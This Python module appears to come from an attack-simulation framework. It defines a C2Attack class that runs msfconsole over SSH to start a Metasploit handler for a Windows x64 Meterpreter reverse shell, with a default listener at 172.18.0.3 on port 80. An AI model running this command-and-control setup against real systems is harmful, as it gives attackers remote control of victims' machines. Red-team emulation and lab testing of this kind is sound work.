from typing import Any, List

from attacks.attack import AttackOptions, Attack


class C2AttackOptions(AttackOptions):
    lhost: str
    lport: str
    reverse_type: str

    def __init__(self, **kwargs: Any):
        self._set_options_to_none()
        self._set_defaults()
        super().__init__(**kwargs)

    def _set_options_to_none(self) -> None:
        default_options = dict.fromkeys(self._options(), None)
        default_options = _set_custom_defaults(default_options)
        self.__dict__.update(default_options)

    @classmethod
    def _options(cls) -> List[str]:
        _set_custom_description(cls)
        return [att for att in dir(cls) if not att.startswith("_")]

    def _set_defaults(self) -> None:
        pass


class C2Attack(Attack):
    options_class = C2AttackOptions

    def __init__(self, options=None, printer=None, ssh_client=None):
        super().__init__(options, printer, ssh_client)
        self.commands = [self._reverse_command()]
        self._append_command()

    def _reverse_command(self):
        return (
            "msfconsole --exec-command "
            "\""
            "use exploit/multi/handler;"
            f"set payload windows/x64/meterpreter/reverse_{self.options.reverse_type};"
            f"set lhost {self.options.lhost};"
            f"set lport {self.options.lport};"
            "exploit;"
            "\"")

    def _append_command(self):
        pass


def _set_custom_defaults(default_options):
    default_options["lhost"] = "172.18.0.3"
    default_options["lport"] = "80"
    default_options["reverse_type"] = "http"

    return default_options


def _set_custom_description(cls):
    cls.lhost = "Reverse target host or IP address"
    cls.lport = "Reverse target port"
    cls.reverse_type = "Reverse Payload type"
